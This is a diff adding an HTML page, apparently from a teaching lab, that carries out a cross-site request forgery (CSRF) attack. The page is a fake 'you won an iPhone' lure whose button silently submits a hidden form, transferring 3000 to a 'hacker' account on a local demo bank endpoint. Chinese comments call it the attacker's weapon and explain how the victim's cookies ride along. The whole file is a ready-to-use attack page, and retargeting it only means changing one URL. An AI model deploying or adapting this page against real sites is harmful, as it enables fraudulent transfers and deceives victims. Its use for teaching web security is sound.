@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<!--
+  ╔══════════════════════════════════════════════════════╗
+  ║     🗡️ CSRF 攻击武器 — 你亲手写的恶意网页           ║
+  ║                                                      ║
+  ║     这个文件就是黑客的"武器"                         ║
+  ║     受害者打开这个页面 → 自动向银行发起转账请求       ║
+  ║                                                      ║
+  ║     使用方法: 用浏览器直接打开这个HTML文件            ║
+  ╚══════════════════════════════════════════════════════╝
+-->
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>🎉 恭喜中奖！点击领取 iPhone 15 Pro Max</title>
+    <style>
+        body {
+            font-family: system-ui;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+        .trap-card {
+            background: white;
+            border-radius: 20px;
+            padding: 50px 40px;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,.3);
+            max-width: 420px;
+        }
+        h1 { color: #eab308; font-size: 28px; margin-bottom: 10px; }
+        .prize { font-size: 60px; margin: 20px 0; }
+        p { color: #64748b; line-height: 1.6; margin-bottom: 25px; }
+        .btn {
+            background: linear-gradient(135deg, #f59e0b, #ef4444);
+            color: white;
+            border: none;
+            padding: 16px 48px;
+            font-size: 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: .2s;
+        }
+        .btn:hover { transform: scale(1.05); }
+        .fineprint { font-size: 11px; color: #94a3b8; margin-top: 20px; }
+
+        /* ====== 🔽 关键：隐藏的转账表单 ====== */
+        #hack-form {
+            display: none;  /* 隐藏！受害者完全看不到这个表单！ */
+        }
+    </style>
+</head>
+<body>
+
+<div class="trap-card">
+    <!-- 👆 这是受害者看到的：一个中奖页面 -->
+    <h1>🎊 恭喜您中奖了！</h1>
+    <div class="prize">📱</div>
+    <p><strong>iPhone 15 Pro Max 1TB</strong><br>价值 ¥13,999<br>仅限今日领取！</p>
+
+    <!--
+        ⚠️ 这个按钮看起来是"领奖"
+        但实际上它会触发下面的隐藏表单！
+    -->
+    <button class="btn" onclick="attack()">立即领取奖品</button>
+
+    <p class="fineprint">* 点击即表示您同意我们的服务条款</p>
+</div>
+
+<!--
+  ╔═════════════════════════════════════════════════════╗
+  ║         🔴🔴🔴  核心攻击代码在这里  🔴🔴🔴          ║
+  ║                                                     ║
+  ║  这就是CSRF攻击的全部秘密——一个隐藏的表单！        ║
+  ╚═════════════════════════════════════════════════════╝
+-->
+<form id="hack-form" method="POST" action="http://127.0.0.1:5000/transfer">
+    <!--
+      action = 转账的目标URL（银行的转账接口）
+      method = POST（和银行自己的表单一样）
+    -->
+
+    <!-- 收款人：钱转到谁的账户 -->
+    <input type="hidden" name="to_account" value="hacker">
+
+    <!-- 转账金额 -->
+    <input type="hidden" name="amount" value="3000">
+</form>
+
+<script>
+/**
+ * 攻击函数：当受害者点"领奖按钮"时执行
+ * 
+ * 做的事情就一件：提交那个隐藏的转账表单
+ * 浏览器会自动带上银行网站的 Cookie
+ * 银行服务器以为这是用户本人的操作 → 转账成功！
+ */
+function attack() {
+    // 显示"正在处理中..."让受害者等着
+    document.querySelector('.btn').textContent = '⏳ 正在处理...';
+    document.querySelector('.btn').style.background = '#6b7280';
+
+    // 延迟500ms提交（让受害者看到"处理中"的假象）
+    setTimeout(() => {
+        document.getElementById('hack-form').submit();
+    }, 500);
+}
+</script>
+
+</body>
+</html>
